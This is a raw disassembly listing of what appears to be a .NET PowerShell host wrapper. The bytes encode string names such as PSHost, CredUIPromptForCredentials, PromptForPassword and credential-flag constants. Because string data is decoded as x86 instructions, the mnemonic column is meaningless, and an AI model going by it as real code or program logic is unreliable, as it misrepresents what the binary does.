  40741d:	42                   	inc    %edx
  40741e:	6f                   	outsl  %ds:(%esi),(%dx)
  40741f:	78 00                	js     0x407421
  407421:	52                   	push   %edx
  407422:	65 61                	gs popa
  407424:	64 4b                	fs dec %ebx
  407426:	65 79 5f             	gs jns 0x407488
  407429:	42                   	inc    %edx
  40742a:	6f                   	outsl  %ds:(%esi),(%dx)
  40742b:	78 00                	js     0x40742d
  40742d:	4b                   	dec    %ebx
  40742e:	65 79 62             	gs jns 0x407493
  407431:	6f                   	outsl  %ds:(%esi),(%dx)
  407432:	61                   	popa
  407433:	72 64                	jb     0x407499
  407435:	5f                   	pop    %edi
  407436:	46                   	inc    %esi
  407437:	6f                   	outsl  %ds:(%esi),(%dx)
  407438:	72 6d                	jb     0x4074a7
  40743a:	00 50 72             	add    %dl,0x72(%eax)
  40743d:	6f                   	outsl  %ds:(%esi),(%dx)
  40743e:	67 72 65             	addr16 jb 0x4074a6
  407441:	73 73                	jae    0x4074b6
  407443:	5f                   	pop    %edi
  407444:	46                   	inc    %esi
  407445:	6f                   	outsl  %ds:(%esi),(%dx)
  407446:	72 6d                	jb     0x4074b5
  407448:	00 50 72             	add    %dl,0x72(%eax)
  40744b:	6f                   	outsl  %ds:(%esi),(%dx)
  40744c:	67 72 65             	addr16 jb 0x4074b4
  40744f:	73 73                	jae    0x4074c4
  407451:	5f                   	pop    %edi
  407452:	44                   	inc    %esp
  407453:	61                   	popa
  407454:	74 61                	je     0x4074b7
  407456:	00 43 6f             	add    %al,0x6f(%ebx)
  407459:	6e                   	outsb  %ds:(%esi),(%dx)
  40745a:	73 6f                	jae    0x4074cb
  40745c:	6c                   	insb   (%dx),%es:(%edi)
  40745d:	65 5f                	gs pop %edi
  40745f:	49                   	dec    %ecx
  407460:	6e                   	outsb  %ds:(%esi),(%dx)
  407461:	66 6f                	outsw  %ds:(%esi),(%dx)
  407463:	00 46 69             	add    %al,0x69(%esi)
  407466:	6c                   	insb   (%dx),%es:(%edi)
  407467:	65 54                	gs push %esp
  407469:	79 70                	jns    0x4074db
  40746b:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  40746f:	44                   	inc    %esp
  407470:	48                   	dec    %eax
  407471:	61                   	popa
  407472:	6e                   	outsb  %ds:(%esi),(%dx)
  407473:	64 6c                	fs insb (%dx),%es:(%edi)
  407475:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  407479:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407480:	65 55                	gs push %ebp
  407482:	49                   	dec    %ecx
  407483:	00 4d 61             	add    %cl,0x61(%ebp)
  407486:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40748d:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407491:	6e                   	outsb  %ds:(%esi),(%dx)
  407492:	73 6f                	jae    0x407503
  407494:	6c                   	insb   (%dx),%es:(%edi)
  407495:	65 43                	gs inc %ebx
  407497:	6f                   	outsl  %ds:(%esi),(%dx)
  407498:	6c                   	insb   (%dx),%es:(%edi)
  407499:	6f                   	outsl  %ds:(%esi),(%dx)
  40749a:	72 50                	jb     0x4074ec
  40749c:	72 6f                	jb     0x40750d
  40749e:	78 79                	js     0x407519
  4074a0:	00 4d 61             	add    %cl,0x61(%ebp)
  4074a3:	69 6e 41 70 70 49 6e 	imul   $0x6e497070,0x41(%esi),%ebp
  4074aa:	74 65                	je     0x407511
  4074ac:	72 66                	jb     0x407514
  4074ae:	61                   	popa
  4074af:	63 65 00             	arpl   %esp,0x0(%ebp)
  4074b2:	4d                   	dec    %ebp
  4074b3:	61                   	popa
  4074b4:	69 6e 41 70 70 00 6d 	imul   $0x6d007070,0x41(%esi),%ebp
  4074bb:	73 63                	jae    0x407520
  4074bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4074be:	72 6c                	jb     0x40752c
  4074c0:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4074c7:	65 6d                	gs insl (%dx),%es:(%edi)
  4074c9:	00 4f 62             	add    %cl,0x62(%edi)
  4074cc:	6a 65                	push   $0x65
  4074ce:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  4074d2:	61                   	popa
  4074d3:	6c                   	insb   (%dx),%es:(%edi)
  4074d4:	75 65                	jne    0x40753b
  4074d6:	54                   	push   %esp
  4074d7:	79 70                	jns    0x407549
  4074d9:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  4074dd:	75 6d                	jne    0x40754c
  4074df:	00 53 79             	add    %dl,0x79(%ebx)
  4074e2:	73 74                	jae    0x407558
  4074e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4074e6:	2e 4d                	cs dec %ebp
  4074e8:	61                   	popa
  4074e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ea:	61                   	popa
  4074eb:	67 65 6d             	gs insl (%dx),%es:(%di)
  4074ee:	65 6e                	outsb  %gs:(%esi),(%dx)
  4074f0:	74 2e                	je     0x407520
  4074f2:	41                   	inc    %ecx
  4074f3:	75 74                	jne    0x407569
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6d                   	insl   (%dx),%es:(%edi)
  4074f7:	61                   	popa
  4074f8:	74 69                	je     0x407563
  4074fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4074fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4074fc:	00 53 79             	add    %dl,0x79(%ebx)
  4074ff:	73 74                	jae    0x407575
  407501:	65 6d                	gs insl (%dx),%es:(%edi)
  407503:	2e 4d                	cs dec %ebp
  407505:	61                   	popa
  407506:	6e                   	outsb  %ds:(%esi),(%dx)
  407507:	61                   	popa
  407508:	67 65 6d             	gs insl (%dx),%es:(%di)
  40750b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40750d:	74 2e                	je     0x40753d
  40750f:	41                   	inc    %ecx
  407510:	75 74                	jne    0x407586
  407512:	6f                   	outsl  %ds:(%esi),(%dx)
  407513:	6d                   	insl   (%dx),%es:(%edi)
  407514:	61                   	popa
  407515:	74 69                	je     0x407580
  407517:	6f                   	outsl  %ds:(%esi),(%dx)
  407518:	6e                   	outsb  %ds:(%esi),(%dx)
  407519:	2e 48                	cs dec %eax
  40751b:	6f                   	outsl  %ds:(%esi),(%dx)
  40751c:	73 74                	jae    0x407592
  40751e:	00 50 53             	add    %dl,0x53(%eax)
  407521:	48                   	dec    %eax
  407522:	6f                   	outsl  %ds:(%esi),(%dx)
  407523:	73 74                	jae    0x407599
  407525:	52                   	push   %edx
  407526:	61                   	popa
  407527:	77 55                	ja     0x40757e
  407529:	73 65                	jae    0x407590
  40752b:	72 49                	jb     0x407576
  40752d:	6e                   	outsb  %ds:(%esi),(%dx)
  40752e:	74 65                	je     0x407595
  407530:	72 66                	jb     0x407598
  407532:	61                   	popa
  407533:	63 65 00             	arpl   %esp,0x0(%ebp)
  407536:	53                   	push   %ebx
  407537:	79 73                	jns    0x4075ac
  407539:	74 65                	je     0x4075a0
  40753b:	6d                   	insl   (%dx),%es:(%edi)
  40753c:	2e 57                	cs push %edi
  40753e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  407545:	46                   	inc    %esi
  407546:	6f                   	outsl  %ds:(%esi),(%dx)
  407547:	72 6d                	jb     0x4075b6
  407549:	73 00                	jae    0x40754b
  40754b:	46                   	inc    %esi
  40754c:	6f                   	outsl  %ds:(%esi),(%dx)
  40754d:	72 6d                	jb     0x4075bc
  40754f:	00 50 53             	add    %dl,0x53(%eax)
  407552:	48                   	dec    %eax
  407553:	6f                   	outsl  %ds:(%esi),(%dx)
  407554:	73 74                	jae    0x4075ca
  407556:	55                   	push   %ebp
  407557:	73 65                	jae    0x4075be
  407559:	72 49                	jb     0x4075a4
  40755b:	6e                   	outsb  %ds:(%esi),(%dx)
  40755c:	74 65                	je     0x4075c3
  40755e:	72 66                	jb     0x4075c6
  407560:	61                   	popa
  407561:	63 65 00             	arpl   %esp,0x0(%ebp)
  407564:	50                   	push   %eax
  407565:	53                   	push   %ebx
  407566:	48                   	dec    %eax
  407567:	6f                   	outsl  %ds:(%esi),(%dx)
  407568:	73 74                	jae    0x4075de
  40756a:	00 53 79             	add    %dl,0x79(%ebx)
  40756d:	73 74                	jae    0x4075e3
  40756f:	65 6d                	gs insl (%dx),%es:(%edi)
  407571:	2e 54                	cs push %esp
  407573:	65 78 74             	gs js  0x4075ea
  407576:	00 53 74             	add    %dl,0x74(%ebx)
  407579:	72 69                	jb     0x4075e4
  40757b:	6e                   	outsb  %ds:(%esi),(%dx)
  40757c:	67 42                	addr16 inc %edx
  40757e:	75 69                	jne    0x4075e9
  407580:	6c                   	insb   (%dx),%es:(%edi)
  407581:	64 65 72 00          	fs gs jb 0x407585
  407585:	43                   	inc    %ebx
  407586:	72 65                	jb     0x4075ed
  407588:	64 55                	fs push %ebp
  40758a:	49                   	dec    %ecx
  40758b:	50                   	push   %eax
  40758c:	72 6f                	jb     0x4075fd
  40758e:	6d                   	insl   (%dx),%es:(%edi)
  40758f:	70 74                	jo     0x407605
  407591:	46                   	inc    %esi
  407592:	6f                   	outsl  %ds:(%esi),(%dx)
  407593:	72 43                	jb     0x4075d8
  407595:	72 65                	jb     0x4075fc
  407597:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40759a:	74 69                	je     0x407605
  40759c:	61                   	popa
  40759d:	6c                   	insb   (%dx),%es:(%edi)
  40759e:	73 00                	jae    0x4075a0
  4075a0:	50                   	push   %eax
  4075a1:	53                   	push   %ebx
  4075a2:	43                   	inc    %ebx
  4075a3:	72 65                	jb     0x40760a
  4075a5:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4075a8:	74 69                	je     0x407613
  4075aa:	61                   	popa
  4075ab:	6c                   	insb   (%dx),%es:(%edi)
  4075ac:	54                   	push   %esp
  4075ad:	79 70                	jns    0x40761f
  4075af:	65 73 00             	gs jae 0x4075b2
  4075b2:	50                   	push   %eax
  4075b3:	53                   	push   %ebx
  4075b4:	43                   	inc    %ebx
  4075b5:	72 65                	jb     0x40761c
  4075b7:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4075ba:	74 69                	je     0x407625
  4075bc:	61                   	popa
  4075bd:	6c                   	insb   (%dx),%es:(%edi)
  4075be:	55                   	push   %ebp
  4075bf:	49                   	dec    %ecx
  4075c0:	4f                   	dec    %edi
  4075c1:	70 74                	jo     0x407637
  4075c3:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  4075ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4075cb:	6d                   	insl   (%dx),%es:(%edi)
  4075cc:	70 74                	jo     0x407642
  4075ce:	46                   	inc    %esi
  4075cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d0:	72 50                	jb     0x407622
  4075d2:	61                   	popa
  4075d3:	73 73                	jae    0x407648
  4075d5:	77 6f                	ja     0x407646
  4075d7:	72 64                	jb     0x40763d
  4075d9:	00 2e                	add    %ch,(%esi)
  4075db:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4075df:	00 63 62             	add    %ah,0x62(%ebx)
  4075e2:	53                   	push   %ebx
  4075e3:	69 7a 65 00 68 77 6e 	imul   $0x6e776800,0x65(%edx),%edi
  4075ea:	64 50                	fs push %eax
  4075ec:	61                   	popa
  4075ed:	72 65                	jb     0x407654
  4075ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f0:	74 00                	je     0x4075f2
  4075f2:	70 73                	jo     0x407667
  4075f4:	7a 4d                	jp     0x407643
  4075f6:	65 73 73             	gs jae 0x40766c
  4075f9:	61                   	popa
  4075fa:	67 65 54             	addr16 gs push %esp
  4075fd:	65 78 74             	gs js  0x407674
  407600:	00 70 73             	add    %dh,0x73(%eax)
  407603:	7a 43                	jp     0x407648
  407605:	61                   	popa
  407606:	70 74                	jo     0x40767c
  407608:	69 6f 6e 54 65 78 74 	imul   $0x74786554,0x6e(%edi),%ebp
  40760f:	00 68 62             	add    %ch,0x62(%eax)
  407612:	6d                   	insl   (%dx),%es:(%edi)
  407613:	42                   	inc    %edx
  407614:	61                   	popa
  407615:	6e                   	outsb  %ds:(%esi),(%dx)
  407616:	6e                   	outsb  %ds:(%esi),(%dx)
  407617:	65 72 00             	gs jb  0x40761a
  40761a:	76 61                	jbe    0x40767d
  40761c:	6c                   	insb   (%dx),%es:(%edi)
  40761d:	75 65                	jne    0x407684
  40761f:	5f                   	pop    %edi
  407620:	5f                   	pop    %edi
  407621:	00 49 4e             	add    %cl,0x4e(%ecx)
  407624:	43                   	inc    %ebx
  407625:	4f                   	dec    %edi
  407626:	52                   	push   %edx
  407627:	52                   	push   %edx
  407628:	45                   	inc    %ebp
  407629:	43                   	inc    %ebx
  40762a:	54                   	push   %esp
  40762b:	5f                   	pop    %edi
  40762c:	50                   	push   %eax
  40762d:	41                   	inc    %ecx
  40762e:	53                   	push   %ebx
  40762f:	53                   	push   %ebx
  407630:	57                   	push   %edi
  407631:	4f                   	dec    %edi
  407632:	52                   	push   %edx
  407633:	44                   	inc    %esp
  407634:	00 44 4f 5f          	add    %al,0x5f(%edi,%ecx,2)
  407638:	4e                   	dec    %esi
  407639:	4f                   	dec    %edi
  40763a:	54                   	push   %esp
  40763b:	5f                   	pop    %edi
  40763c:	50                   	push   %eax
  40763d:	45                   	inc    %ebp
  40763e:	52                   	push   %edx
  40763f:	53                   	push   %ebx
  407640:	49                   	dec    %ecx
  407641:	53                   	push   %ebx
  407642:	54                   	push   %esp
  407643:	00 52 45             	add    %dl,0x45(%edx)
  407646:	51                   	push   %ecx
  407647:	55                   	push   %ebp
  407648:	45                   	inc    %ebp
  407649:	53                   	push   %ebx
  40764a:	54                   	push   %esp
  40764b:	5f                   	pop    %edi
  40764c:	41                   	inc    %ecx
  40764d:	44                   	inc    %esp
  40764e:	4d                   	dec    %ebp
  40764f:	49                   	dec    %ecx
  407650:	4e                   	dec    %esi
  407651:	49                   	dec    %ecx
  407652:	53                   	push   %ebx
  407653:	54                   	push   %esp
  407654:	52                   	push   %edx
  407655:	41                   	inc    %ecx
  407656:	54                   	push   %esp
  407657:	4f                   	dec    %edi
  407658:	52                   	push   %edx
  407659:	00 45 58             	add    %al,0x58(%ebp)
  40765c:	43                   	inc    %ebx
  40765d:	4c                   	dec    %esp
  40765e:	55                   	push   %ebp
  40765f:	44                   	inc    %esp
  407660:	45                   	inc    %ebp
  407661:	5f                   	pop    %edi
  407662:	43                   	inc    %ebx
  407663:	45                   	inc    %ebp
  407664:	52                   	push   %edx
  407665:	54                   	push   %esp
  407666:	49                   	dec    %ecx
  407667:	46                   	inc    %esi
  407668:	49                   	dec    %ecx
  407669:	43                   	inc    %ebx
  40766a:	41                   	inc    %ecx
  40766b:	54                   	push   %esp
  40766c:	45                   	inc    %ebp
  40766d:	53                   	push   %ebx
  40766e:	00 52 45             	add    %dl,0x45(%edx)
  407671:	51                   	push   %ecx
  407672:	55                   	push   %ebp
  407673:	49                   	dec    %ecx
  407674:	52                   	push   %edx
  407675:	45                   	inc    %ebp
  407676:	5f                   	pop    %edi
  407677:	43                   	inc    %ebx
  407678:	45                   	inc    %ebp
  407679:	52                   	push   %edx
  40767a:	54                   	push   %esp
  40767b:	49                   	dec    %ecx
  40767c:	46                   	inc    %esi
  40767d:	49                   	dec    %ecx
  40767e:	43                   	inc    %ebx
  40767f:	41                   	inc    %ecx
  407680:	54                   	push   %esp
  407681:	45                   	inc    %ebp
  407682:	00 53 48             	add    %dl,0x48(%ebx)
  407685:	4f                   	dec    %edi
  407686:	57                   	push   %edi
  407687:	5f                   	pop    %edi
  407688:	53                   	push   %ebx
  407689:	41                   	inc    %ecx
  40768a:	56                   	push   %esi
  40768b:	45                   	inc    %ebp
  40768c:	5f                   	pop    %edi
  40768d:	43                   	inc    %ebx
  40768e:	48                   	dec    %eax
  40768f:	45                   	inc    %ebp
  407690:	43                   	inc    %ebx
  407691:	4b                   	dec    %ebx
  407692:	5f                   	pop    %edi
  407693:	42                   	inc    %edx
  407694:	4f                   	dec    %edi
  407695:	58                   	pop    %eax
  407696:	00 41 4c             	add    %al,0x4c(%ecx)
  407699:	57                   	push   %edi
  40769a:	41                   	inc    %ecx
  40769b:	59                   	pop    %ecx
  40769c:	53                   	push   %ebx
  40769d:	5f                   	pop    %edi
  40769e:	53                   	push   %ebx
  40769f:	48                   	dec    %eax
  4076a0:	4f                   	dec    %edi
  4076a1:	57                   	push   %edi
  4076a2:	5f                   	pop    %edi
  4076a3:	55                   	push   %ebp
  4076a4:	49                   	dec    %ecx
  4076a5:	00 52 45             	add    %dl,0x45(%edx)
  4076a8:	51                   	push   %ecx
  4076a9:	55                   	push   %ebp
  4076aa:	49                   	dec    %ecx
  4076ab:	52                   	push   %edx
  4076ac:	45                   	inc    %ebp
  4076ad:	5f                   	pop    %edi
  4076ae:	53                   	push   %ebx
  4076af:	4d                   	dec    %ebp
  4076b0:	41                   	inc    %ecx
  4076b1:	52                   	push   %edx
  4076b2:	54                   	push   %esp
  4076b3:	43                   	inc    %ebx
  4076b4:	41                   	inc    %ecx
  4076b5:	52                   	push   %edx
  4076b6:	44                   	inc    %esp
  4076b7:	00 50 41             	add    %dl,0x41(%eax)
  4076ba:	53                   	push   %ebx
  4076bb:	53                   	push   %ebx
  4076bc:	57                   	push   %edi
  4076bd:	4f                   	dec    %edi
  4076be:	52                   	push   %edx
  4076bf:	44                   	inc    %esp
  4076c0:	5f                   	pop    %edi
  4076c1:	4f                   	dec    %edi
  4076c2:	4e                   	dec    %esi
  4076c3:	4c                   	dec    %esp
  4076c4:	59                   	pop    %ecx
  4076c5:	5f                   	pop    %edi
  4076c6:	4f                   	dec    %edi
  4076c7:	4b                   	dec    %ebx
  4076c8:	00 56 41             	add    %dl,0x41(%esi)
  4076cb:	4c                   	dec    %esp
  4076cc:	49                   	dec    %ecx
  4076cd:	44                   	inc    %esp
  4076ce:	41                   	inc    %ecx
  4076cf:	54                   	push   %esp
  4076d0:	45                   	inc    %ebp
  4076d1:	5f                   	pop    %edi
  4076d2:	55                   	push   %ebp
  4076d3:	53                   	push   %ebx
  4076d4:	45                   	inc    %ebp
  4076d5:	52                   	push   %edx
  4076d6:	4e                   	dec    %esi
  4076d7:	41                   	inc    %ecx
  4076d8:	4d                   	dec    %ebp
  4076d9:	45                   	inc    %ebp
  4076da:	00 43 4f             	add    %al,0x4f(%ebx)
  4076dd:	4d                   	dec    %ebp
  4076de:	50                   	push   %eax
  4076df:	4c                   	dec    %esp
  4076e0:	45                   	inc    %ebp
  4076e1:	54                   	push   %esp
  4076e2:	45                   	inc    %ebp
  4076e3:	5f                   	pop    %edi
  4076e4:	55                   	push   %ebp
  4076e5:	53                   	push   %ebx
  4076e6:	45                   	inc    %ebp
  4076e7:	52                   	push   %edx
  4076e8:	4e                   	dec    %esi
  4076e9:	41                   	inc    %ecx
  4076ea:	4d                   	dec    %ebp
  4076eb:	45                   	inc    %ebp
  4076ec:	00 50 45             	add    %dl,0x45(%eax)
  4076ef:	52                   	push   %edx
  4076f0:	53                   	push   %ebx
  4076f1:	49                   	dec    %ecx
  4076f2:	53                   	push   %ebx
  4076f3:	54                   	push   %esp
  4076f4:	00 53 45             	add    %dl,0x45(%ebx)
  4076f7:	52                   	push   %edx
  4076f8:	56                   	push   %esi
  4076f9:	45                   	inc    %ebp
  4076fa:	52                   	push   %edx
  4076fb:	5f                   	pop    %edi
  4076fc:	43                   	inc    %ebx
  4076fd:	52                   	push   %edx
  4076fe:	45                   	inc    %ebp
  4076ff:	44                   	inc    %esp
  407700:	45                   	inc    %ebp
  407701:	4e                   	dec    %esi
  407702:	54                   	push   %esp
  407703:	49                   	dec    %ecx
  407704:	41                   	inc    %ecx
  407705:	4c                   	dec    %esp
  407706:	00 45 58             	add    %al,0x58(%ebp)
  407709:	50                   	push   %eax
  40770a:	45                   	inc    %ebp
  40770b:	43                   	inc    %ebx
  40770c:	54                   	push   %esp
  40770d:	5f                   	pop    %edi
  40770e:	43                   	inc    %ebx
  40770f:	4f                   	dec    %edi
  407710:	4e                   	dec    %esi
  407711:	46                   	inc    %esi
  407712:	49                   	dec    %ecx
  407713:	52                   	push   %edx
  407714:	4d                   	dec    %ebp
  407715:	41                   	inc    %ecx
  407716:	54                   	push   %esp
  407717:	49                   	dec    %ecx
  407718:	4f                   	dec    %edi
  407719:	4e                   	dec    %esi
  40771a:	00 47 45             	add    %al,0x45(%edi)
  40771d:	4e                   	dec    %esi
  40771e:	45                   	inc    %ebp
  40771f:	52                   	push   %edx
  407720:	49                   	dec    %ecx
  407721:	43                   	inc    %ebx
  407722:	5f                   	pop    %edi
  407723:	43                   	inc    %ebx
  407724:	52                   	push   %edx
  407725:	45                   	inc    %ebp
  407726:	44                   	inc    %esp
  407727:	45                   	inc    %ebp
  407728:	4e                   	dec    %esi
  407729:	54                   	push   %esp
  40772a:	49                   	dec    %ecx
  40772b:	41                   	inc    %ecx
  40772c:	4c                   	dec    %esp
  40772d:	53                   	push   %ebx
  40772e:	00 55 53             	add    %dl,0x53(%ebp)
  407731:	45                   	inc    %ebp
  407732:	52                   	push   %edx
  407733:	4e                   	dec    %esi
  407734:	41                   	inc    %ecx
  407735:	4d                   	dec    %ebp
  407736:	45                   	inc    %ebp
  407737:	5f                   	pop    %edi
  407738:	54                   	push   %esp
  407739:	41                   	inc    %ecx
  40773a:	52                   	push   %edx
  40773b:	47                   	inc    %edi
  40773c:	45                   	inc    %ebp
  40773d:	54                   	push   %esp
  40773e:	5f                   	pop    %edi
  40773f:	43                   	inc    %ebx
  407740:	52                   	push   %edx
  407741:	45                   	inc    %ebp
  407742:	44                   	inc    %esp
  407743:	45                   	inc    %ebp
  407744:	4e                   	dec    %esi
  407745:	54                   	push   %esp
  407746:	49                   	dec    %ecx
  407747:	41                   	inc    %ecx
  407748:	4c                   	dec    %esp
  407749:	53                   	push   %ebx
  40774a:	00 4b 45             	add    %cl,0x45(%ebx)
  40774d:	45                   	inc    %ebp
  40774e:	50                   	push   %eax
  40774f:	5f                   	pop    %edi
  407750:	55                   	push   %ebp
  407751:	53                   	push   %ebx
  407752:	45                   	inc    %ebp
  407753:	52                   	push   %edx
  407754:	4e                   	dec    %esi
  407755:	41                   	inc    %ecx
  407756:	4d                   	dec    %ebp
  407757:	45                   	inc    %ebp
  407758:	00 4e 4f             	add    %cl,0x4f(%esi)
  40775b:	5f                   	pop    %edi
  40775c:	45                   	inc    %ebp
  40775d:	52                   	push   %edx
  40775e:	52                   	push   %edx
  40775f:	4f                   	dec    %edi
  407760:	52                   	push   %edx
  407761:	00 45 52             	add    %al,0x52(%ebp)
  407764:	52                   	push   %edx
  407765:	4f                   	dec    %edi
  407766:	52                   	push   %edx
  407767:	5f                   	pop    %edi
  407768:	43                   	inc    %ebx
  407769:	41                   	inc    %ecx
  40776a:	4e                   	dec    %esi
  40776b:	43                   	inc    %ebx
  40776c:	45                   	inc    %ebp
  40776d:	4c                   	dec    %esp
  40776e:	4c                   	dec    %esp
  40776f:	45                   	inc    %ebp
  407770:	44                   	inc    %esp
  407771:	00 45 52             	add    %al,0x52(%ebp)
  407774:	52                   	push   %edx
  407775:	4f                   	dec    %edi
  407776:	52                   	push   %edx
  407777:	5f                   	pop    %edi
  407778:	4e                   	dec    %esi
  407779:	4f                   	dec    %edi
  40777a:	5f                   	pop    %edi
  40777b:	53                   	push   %ebx
  40777c:	55                   	push   %ebp
  40777d:	43                   	inc    %ebx
  40777e:	48                   	dec    %eax
  40777f:	5f                   	pop    %edi
  407780:	4c                   	dec    %esp
  407781:	4f                   	dec    %edi
  407782:	47                   	inc    %edi
  407783:	4f                   	dec    %edi
  407784:	4e                   	dec    %esi
  407785:	5f                   	pop    %edi
  407786:	53                   	push   %ebx
  407787:	45                   	inc    %ebp
  407788:	53                   	push   %ebx
  407789:	53                   	push   %ebx
  40778a:	49                   	dec    %ecx
  40778b:	4f                   	dec    %edi
  40778c:	4e                   	dec    %esi
  40778d:	00 45 52             	add    %al,0x52(%ebp)
  407790:	52                   	push   %edx
  407791:	4f                   	dec    %edi
  407792:	52                   	push   %edx
  407793:	5f                   	pop    %edi
  407794:	4e                   	dec    %esi
  407795:	4f                   	dec    %edi
  407796:	54                   	push   %esp
  407797:	5f                   	pop    %edi
  407798:	46                   	inc    %esi
  407799:	4f                   	dec    %edi
  40779a:	55                   	push   %ebp
  40779b:	4e                   	dec    %esi
  40779c:	44                   	inc    %esp
  40779d:	00 45 52             	add    %al,0x52(%ebp)
  4077a0:	52                   	push   %edx
  4077a1:	4f                   	dec    %edi
  4077a2:	52                   	push   %edx
  4077a3:	5f                   	pop    %edi
  4077a4:	49                   	dec    %ecx
  4077a5:	4e                   	dec    %esi
  4077a6:	56                   	push   %esi
  4077a7:	41                   	inc    %ecx
  4077a8:	4c                   	dec    %esp
  4077a9:	49                   	dec    %ecx
  4077aa:	44                   	inc    %esp
  4077ab:	5f                   	pop    %edi
  4077ac:	41                   	inc    %ecx
  4077ad:	43                   	inc    %ebx
  4077ae:	43                   	inc    %ebx
  4077af:	4f                   	dec    %edi
  4077b0:	55                   	push   %ebp
  4077b1:	4e                   	dec    %esi
  4077b2:	54                   	push   %esp
  4077b3:	5f                   	pop    %edi
  4077b4:	4e                   	dec    %esi
  4077b5:	41                   	inc    %ecx
  4077b6:	4d                   	dec    %ebp
  4077b7:	45                   	inc    %ebp
  4077b8:	00 45 52             	add    %al,0x52(%ebp)
  4077bb:	52                   	push   %edx
  4077bc:	4f                   	dec    %edi
  4077bd:	52                   	push   %edx
  4077be:	5f                   	pop    %edi
  4077bf:	49                   	dec    %ecx
  4077c0:	4e                   	dec    %esi
  4077c1:	53                   	push   %ebx
  4077c2:	55                   	push   %ebp
  4077c3:	46                   	inc    %esi
  4077c4:	46                   	inc    %esi
  4077c5:	49                   	dec    %ecx
  4077c6:	43                   	inc    %ebx
  4077c7:	49                   	dec    %ecx
  4077c8:	45                   	inc    %ebp
  4077c9:	4e                   	dec    %esi
  4077ca:	54                   	push   %esp
  4077cb:	5f                   	pop    %edi
  4077cc:	42                   	inc    %edx
  4077cd:	55                   	push   %ebp
  4077ce:	46                   	inc    %esi
  4077cf:	46                   	inc    %esi
  4077d0:	45                   	inc    %ebp
  4077d1:	52                   	push   %edx
  4077d2:	00 45 52             	add    %al,0x52(%ebp)
  4077d5:	52                   	push   %edx
  4077d6:	4f                   	dec    %edi
  4077d7:	52                   	push   %edx
  4077d8:	5f                   	pop    %edi
  4077d9:	49                   	dec    %ecx
  4077da:	4e                   	dec    %esi
  4077db:	56                   	push   %esi
  4077dc:	41                   	inc    %ecx
  4077dd:	4c                   	dec    %esp
  4077de:	49                   	dec    %ecx
  4077df:	44                   	inc    %esp
  4077e0:	5f                   	pop    %edi
  4077e1:	50                   	push   %eax
  4077e2:	41                   	inc    %ecx
  4077e3:	52                   	push   %edx
  4077e4:	41                   	inc    %ecx
  4077e5:	4d                   	dec    %ebp
  4077e6:	45                   	inc    %ebp
  4077e7:	54                   	push   %esp
  4077e8:	45                   	inc    %ebp
  4077e9:	52                   	push   %edx
  4077ea:	00 45 52             	add    %al,0x52(%ebp)
  4077ed:	52                   	push   %edx
  4077ee:	4f                   	dec    %edi
  4077ef:	52                   	push   %edx
  4077f0:	5f                   	pop    %edi
  4077f1:	49                   	dec    %ecx
  4077f2:	4e                   	dec    %esi
  4077f3:	56                   	push   %esi
  4077f4:	41                   	inc    %ecx
  4077f5:	4c                   	dec    %esp
  4077f6:	49                   	dec    %ecx
  4077f7:	44                   	inc    %esp
  4077f8:	5f                   	pop    %edi
  4077f9:	46                   	inc    %esi
  4077fa:	4c                   	dec    %esp
  4077fb:	41                   	inc    %ecx
  4077fc:	47                   	inc    %edi
  4077fd:	53                   	push   %ebx
  4077fe:	00 55 73             	add    %dl,0x73(%ebp)
  407801:	65 72 00             	gs jb  0x407804
  407804:	50                   	push   %eax
  407805:	61                   	popa
  407806:	73 73                	jae    0x40787b
  407808:	77 6f                	ja     0x407879
  40780a:	72 64                	jb     0x407870
  40780c:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  407810:	61                   	popa
  407811:	69 6e 00 43 6f 6e 73 	imul   $0x736e6f43,0x0(%esi),%ebp
  407818:	6f                   	outsl  %ds:(%esi),(%dx)
  407819:	6c                   	insb   (%dx),%es:(%edi)
  40781a:	65 43                	gs inc %ebx
  40781c:	6f                   	outsl  %ds:(%esi),(%dx)
  40781d:	6c                   	insb   (%dx),%es:(%edi)
  40781e:	6f                   	outsl  %ds:(%esi),(%dx)
  40781f:	72 00                	jb     0x407821
  407821:	47                   	inc    %edi
  407822:	55                   	push   %ebp
  407823:	49                   	dec    %ecx
  407824:	42                   	inc    %edx
  407825:	61                   	popa
  407826:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407829:	72 6f                	jb     0x40789a
  40782b:	75 6e                	jne    0x40789b
  40782d:	64 43                	fs inc %ebx
  40782f:	6f                   	outsl  %ds:(%esi),(%dx)
  407830:	6c                   	insb   (%dx),%es:(%edi)
  407831:	6f                   	outsl  %ds:(%esi),(%dx)
  407832:	72 00                	jb     0x407834
  407834:	47                   	inc    %edi
  407835:	55                   	push   %ebp
  407836:	49                   	dec    %ecx
  407837:	46                   	inc    %esi
  407838:	6f                   	outsl  %ds:(%esi),(%dx)
  407839:	72 65                	jb     0x4078a0
  40783b:	67 72 6f             	addr16 jb 0x4078ad
  40783e:	75 6e                	jne    0x4078ae
  407840:	64 43                	fs inc %ebx
  407842:	6f                   	outsl  %ds:(%esi),(%dx)
  407843:	6c                   	insb   (%dx),%es:(%edi)
